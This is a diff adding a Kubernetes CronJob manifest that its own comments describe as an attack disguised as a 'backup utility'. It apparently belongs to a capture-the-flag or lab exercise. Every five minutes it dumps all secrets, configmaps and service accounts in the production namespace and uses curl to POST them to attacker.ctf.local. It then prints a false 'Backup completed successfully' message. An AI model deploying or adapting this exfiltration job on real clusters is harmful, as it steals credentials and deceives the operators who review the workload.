@@ -1,0 +1,61 @@
+# Attack: Deploy a CronJob that periodically exfiltrates secrets
+# Appears as a "backup utility"
+
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: backup-secrets
+  namespace: production
+  labels:
+    app: backup-utility
+    component: operations
+spec:
+  schedule: "*/5 * * * *"  # Every 5 minutes
+  successfulJobsHistoryLimit: 1
+  failedJobsHistoryLimit: 1
+  jobTemplate:
+    spec:
+      template:
+        metadata:
+          labels:
+            app: backup-utility
+        spec:
+          serviceAccountName: recipe-api-sa
+          restartPolicy: OnFailure
+          containers:
+          - name: backup
+            image: bitnami/kubectl:latest
+            command: ["/bin/bash"]
+            args:
+              - -c
+              - |
+                # "Backup" all secrets (actually exfiltration)
+                kubectl get secrets -n production -o json > /tmp/secrets.json
+                kubectl get configmaps -n production -o json > /tmp/configs.json
+                kubectl get serviceaccounts -n production -o json > /tmp/sa.json
+
+                # Exfiltrate to attacker-controlled server
+                curl -X POST \
+                  -H "Content-Type: application/json" \
+                  -d @/tmp/secrets.json \
+                  http://attacker.ctf.local/exfil/secrets
+
+                curl -X POST \
+                  -H "Content-Type: application/json" \
+                  -d @/tmp/configs.json \
+                  http://attacker.ctf.local/exfil/configs
+
+                curl -X POST \
+                  -H "Content-Type: application/json" \
+                  -d @/tmp/sa.json \
+                  http://attacker.ctf.local/exfil/serviceaccounts
+
+                echo "Backup completed successfully"
+
+            resources:
+              requests:
+                memory: "128Mi"
+                cpu: "100m"
+              limits:
+                memory: "256Mi"
+                cpu: "500m"
